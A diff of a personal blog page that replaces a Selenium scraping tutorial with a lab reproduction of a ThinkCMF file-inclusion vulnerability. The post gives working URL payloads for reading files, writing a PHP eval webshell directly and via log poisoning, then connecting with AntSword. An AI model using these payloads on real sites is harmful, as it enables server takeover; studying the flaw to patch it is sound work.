@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="python网络爬虫Selenium, Gao Yang">
+    <meta name="keywords" content="ThinkCMF框架任意内容包含漏洞, Gao Yang">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>python网络爬虫Selenium | Gao Yang</title>
+    <title>ThinkCMF框架任意内容包含漏洞 | Gao Yang</title>
     <link rel="icon" type="image/png" href="/gaoyang.icon">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">python网络爬虫Selenium</h1>
+                    <h1 class="description center-align post-title">ThinkCMF框架任意内容包含漏洞</h1>
                 </div>
             </div>
         </div>
@@ -431,8 +431,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/python/">
-                                <span class="chip bg-color">python</span>
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                                <span class="chip bg-color">漏洞复现</span>
                             </a>
                         
                     </div>
@@ -447,7 +447,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-06-08
+                    2021-06-10
                 </div>
                 
 
@@ -468,41 +468,34 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="python网络爬虫Selenium"><a href="#python网络爬虫Selenium" class="headerlink" title="python网络爬虫Selenium"></a>python网络爬虫Selenium</h1><p>大家好！我是羔羊，今天和大家一起探讨下关于selenium库的使用和下载</p>
-<h3 id="selenium的下载"><a href="#selenium的下载" class="headerlink" title="selenium的下载"></a>selenium的下载</h3><p>首先我们需要下载selenium这个库，在这里直接输入代码: pip install selenium -i <a target="_blank" rel="noopener" href="https://pypi.douban.com/simple">https://pypi.douban.com/simple</a></p>
-<p>就可以下载完成了</p>
-<p><img src="/2021/06/08/python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%ABSelenium/image-20210608105115312.png" alt="image-20210608105115312"></p>
-<p>在这里要注意的是出来库以外，我们还需要安装一个插件用来自动开启浏览器进行内容的爬取，所以在这里给大家找了一个别人搭建的下载的地方：</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/mozilla/geckodriver/releases">https://github.com/mozilla/geckodriver/releases</a></p>
-<p><img src="/2021/06/08/python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%ABSelenium/image-20210608104903698.png" alt="image-20210608104903698"></p>
-<p>我选择的是最后面的win64的版本，这里也用他作为例子进行讲解：</p>
-<p><img src="/2021/06/08/python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%ABSelenium/image-20210608105428736.png" alt="image-20210608105428736"></p>
-<p>首先解压缩获得一个叫geckodriver.exe的程序，然后找到火狐浏览器点击右键选择打开文件所在的位置</p>
-<p><img src="/2021/06/08/python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%ABSelenium/image-20210608110100435.png" alt="image-20210608110100435"></p>
-<p>然后将geckodriver.exe放入到该目录位置</p>
-<p><img src="/2021/06/08/python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%ABSelenium/image-20210608110324324.png" alt="image-20210608110324324"></p>
-<p>基本就可以了，这里要注意的是一定要用火狐浏览器，因为我的这个插件是配的火狐浏览器的。</p>
-<p>好了之后我们就可以写一个简单的代码来尝试运行自己的selenium程序了。</p>
-<h3 id="selenium的简单使用"><a href="#selenium的简单使用" class="headerlink" title="selenium的简单使用"></a>selenium的简单使用</h3><p>首先我们先尝试运行程序打开百度网页：</p>
-<p><code>from selenium import webdriver</code></p>
-<p><code>&#39;&#39;&#39;</code><br><code>网络驱动程序 webdriver    可执行路径 executable_path</code><br><code>&#39;&#39;&#39;</code></p>
-<p><code>driver = webdriver.Firefox(executable_path = r&quot;C:\Program Files (x86)\Mozilla Firefox\geckodriver.exe&quot; )</code><br><code>driver.get(&quot;http://www.baidu.com&quot;)</code></p>
-<p>这三行代码，我们一行行来解释</p>
-<ol>
-<li><code>from selenium import webdriver</code></li>
-</ol>
-<p>导入selenium库并且给它取个外号为webdriver</p>
-<ol start="2">
-<li><code>driver = webdriver.Firefox(executable_path = r&quot;C:\Program Files (x86)\Mozilla Firefox\geckodriver.exe&quot; )</code></li>
-</ol>
-<p>通过我们的geckodriver.exe程序来打开火狐浏览器  “C:\Program Files (x86)\Mozilla Firefox\geckodriver.exe” 表示的是这个程序所在的路径，大家请自行替换，小写的r表示的意思是，保持字符原始值的意思，因为python里面字符串中\有转义的含义，如\t可代表TAB，\n代表换行，所以我们需要采取一些方式使得\不被解读为转义字符。</p>
-<ol start="3">
-<li><code>driver.get(&quot;http://www.baidu.com&quot;)</code></li>
-</ol>
-<p>你要去的目标网址</p>
-<p>当你看到出现了一个这样子的页面，那么你的程序就运行成功了</p>
-<p><img src="/2021/06/08/python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%ABSelenium/image-20210608112406303.png" alt="image-20210608112406303"></p>
-<p>打完收工！下一篇给大家讲解下selenium在top250的使用方式</p>
+                <h2 id="ThinkCMF框架任意内容包含漏洞"><a href="#ThinkCMF框架任意内容包含漏洞" class="headerlink" title="ThinkCMF框架任意内容包含漏洞"></a>ThinkCMF框架任意内容包含漏洞</h2><h3 id="适用版本："><a href="#适用版本：" class="headerlink" title="适用版本："></a>适用版本：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ThinkCMF X1.6.0</span><br><span class="line">ThinkCMF X2.1.0</span><br><span class="line">ThinkCMF X2.2.0</span><br><span class="line">ThinkCMF X2.2.1</span><br><span class="line">ThinkCMF X2.2.2</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞原因："><a href="#漏洞原因：" class="headerlink" title="漏洞原因："></a>漏洞原因：</h3><p>因为他在模板路径出的函数运用出现问题，当模板主题不存在时会在当前目录下开始查找，形成文件包含</p>
+<p>对应参数：templateFile为模板文件地址</p>
+<p>构造文件包含 pyload：?a=display&amp;templateFile=README.md</p>
+<p>构造一句话木马pyload：?a=fetch&amp;templateFile=public/index&amp;prefix=’’&amp;content=<php>file_put_contents(‘1.php’,’<?php eval($_REQUEST[520]) ?>‘)</php></p>
+<h3 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>我这里是用windows 2008R2的机器当做服务器 用windows10的当做复现机器</p>
+<p><img src="/2021/06/10/ThinkCMF%E6%A1%86%E6%9E%B6%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210610115550904.png" alt="image-20210610115550904"></p>
+<p>首先找到首页目标</p>
+<p><img src="/2021/06/10/ThinkCMF%E6%A1%86%E6%9E%B6%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210610115704657.png" alt="image-20210610115704657"></p>
+<h6 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h6><p>然后直接在首页上面添加pyload显示结果</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/ThinkCMFX/ThinkCMFX/?a=display&amp;templateFile=README.md">http://127.0.0.1/ThinkCMFX/ThinkCMFX/?a=display&amp;templateFile=README.md</a></p>
+<p><img src="/2021/06/10/ThinkCMF%E6%A1%86%E6%9E%B6%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210610120943199.png" alt="image-20210610120943199"></p>
+<h6 id="写一句话木马"><a href="#写一句话木马" class="headerlink" title="写一句话木马"></a>写一句话木马</h6><p><a target="_blank" rel="noopener" href="http://127.0.0.1/ThinkCMFX/ThinkCMFX/?a=fetch&amp;templateFile=public/index&amp;prefix=&#39;&#39;&amp;content=">http://127.0.0.1/ThinkCMFX/ThinkCMFX/?a=fetch&amp;templateFile=public/index&amp;prefix=&#39;&#39;&amp;content=</a><php>file_put_contents(‘1.php’,’<?php eval($_REQUEST[520]) ?>‘)</php></p>
+<p><img src="/2021/06/10/ThinkCMF%E6%A1%86%E6%9E%B6%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210610121038222.png" alt="image-20210610121038222"></p>
+<p>如果成功了则会显示空白页面，接下来直接访问1.php就可以看到了</p>
+<p><img src="/2021/06/10/ThinkCMF%E6%A1%86%E6%9E%B6%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210610121227730.png" alt="image-20210610121227730"></p>
+<p>然后蚁剑链接</p>
+<p><img src="/2021/06/10/ThinkCMF%E6%A1%86%E6%9E%B6%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210610121415378.png" alt="image-20210610121415378"></p>
+<h6 id="通过缓存日志写shell"><a href="#通过缓存日志写shell" class="headerlink" title="通过缓存日志写shell"></a>通过缓存日志写shell</h6><p>在默认情况下启用了报错日志并且开启了模板缓存，，导致可以使用加载一个不存在的模板来将生成一句话的PHP代码写入data/runtime/Logs/Portal目录下的日志文件中，再次包含该日志文件即可在网站根目录下生成一句话木马</p>
+<p>127.0.0.1/ThinkCMFX/ThinkCMFX/?a=display&amp;templateFile=<?php file_put_contents('1.php','<?php+eval($_POST["520"]);?>‘);die();?&gt;</p>
+<p>当出现下图的时候就已经讲一句话写入日志中了，接下来我们还需要去访问一下日志</p>
+<p><img src="/2021/06/10/ThinkCMF%E6%A1%86%E6%9E%B6%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210610121825049.png" alt="image-20210610121825049"></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/ThinkCMFX/ThinkCMFX/?a=display&amp;templateFile=data/runtime/Logs/Portal/21_06_10.log">http://127.0.0.1/ThinkCMFX/ThinkCMFX/?a=display&amp;templateFile=data/runtime/Logs/Portal/21_06_10.log</a></p>
+<p>21_06_10.log是当天的日期要注意</p>
+<p><img src="/2021/06/10/ThinkCMF%E6%A1%86%E6%9E%B6%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210610122255444.png" alt="image-20210610122255444"></p>
+<p>这样子就会自动生成一个1.php文件了我们就可以直接链接蚁剑了</p>
+<p><img src="/2021/06/10/ThinkCMF%E6%A1%86%E6%9E%B6%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210610123620395.png" alt="image-20210610123620395"></p>
 
                 
             </div>
@@ -529,7 +522,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://gaoiyang.github.io/2021/06/08/python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%ABSelenium/">https://gaoiyang.github.io/2021/06/08/python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%ABSelenium/</a>
+                    <a href="https://gaoiyang.github.io/2021/06/10/ThinkCMF%E6%A1%86%E6%9E%B6%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://gaoiyang.github.io/2021/06/10/ThinkCMF%E6%A1%86%E6%9E%B6%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -567,8 +560,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/python/">
-                                    <span class="chip bg-color">python</span>
+                                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                                    <span class="chip bg-color">漏洞复现</span>
                                 </a>
                             
                         </div>
@@ -739,7 +732,7 @@
         repo: 'GaoIYang.github.io',
         owner: 'GaoIYang',
         admin: "GaoIYang",
-        id: '2021-06-08T10-33-50',
+        id: '2021-06-10T11-50-47',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -767,9 +760,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/06/10/ThinkCMF%E6%A1%86%E6%9E%B6%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
                     <div class="card-image">
@@ -787,9 +781,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-06-10
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-10
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -798,6 +792,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -816,13 +811,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/06/05/python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%ABBeautifulSoup/">
+                <a href="/2021/06/08/python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%ABSelenium/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="python网络爬虫BeautifulSoup">
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="python网络爬虫Selenium">
                         
-                        <span class="card-title">python网络爬虫BeautifulSoup</span>
+                        <span class="card-title">python网络爬虫Selenium</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -833,7 +828,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-05
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-08
                             </span>
                         <span class="publish-author">
                             
